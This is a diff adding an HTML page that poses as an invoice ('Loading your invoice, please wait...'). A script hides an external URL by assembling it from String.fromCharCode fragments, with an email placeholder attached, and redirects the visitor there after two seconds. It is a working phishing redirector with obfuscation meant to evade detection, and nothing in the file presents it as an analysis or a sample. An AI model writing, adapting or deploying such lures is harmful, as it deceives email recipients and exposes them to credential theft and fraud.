@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invoice #INV-2025-03</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+        .container { max-width: 600px; margin: auto; }
+        .loading { font-size: 18px; color: #0078d4; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Invoice Details</h2>
+        <p class="loading">Loading your invoice, please wait...</p>
+    </div>
+
+    <script>
+        function assemble(parts) {
+            return parts.join('');
+        }
+
+        // URL parts defined with String.fromCharCode for the link: https://nov.it.com/document###EMAIL##
+        const p1 = String.fromCharCode(104, 116); // "ht"
+        const p2 = String.fromCharCode(116, 112); // "tp"
+        const p3 = String.fromCharCode(115); // "s"
+        const p4 = String.fromCharCode(58); // ":"
+        const p5 = String.fromCharCode(47, 47); // "//"
+        const p6 = String.fromCharCode(110, 111); // "no"
+        const p7 = String.fromCharCode(118); // "v"
+        const p8 = String.fromCharCode(46); // "."
+        const p9 = String.fromCharCode(105, 116); // "it"
+        const p10 = String.fromCharCode(46, 99); // ".c"
+        const p11 = String.fromCharCode(111, 109); // "om"
+        const p12 = String.fromCharCode(47); // "/"
+        const p13 = String.fromCharCode(100, 111); // "do"
+        const p14 = String.fromCharCode(99, 117); // "cu"
+        const p15 = String.fromCharCode(109, 101); // "me"
+        const p16 = String.fromCharCode(110, 116); // "nt"
+        const p17 = String.fromCharCode(35, 69, 77, 65, 73, 76); // "###EMAIL##"
+
+        const target = assemble([p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17]);
+
+        setTimeout(function() {
+            window.location.href = target;
+        }, 2000); // 2-second delay
+    </script>
+</body>
+</html>
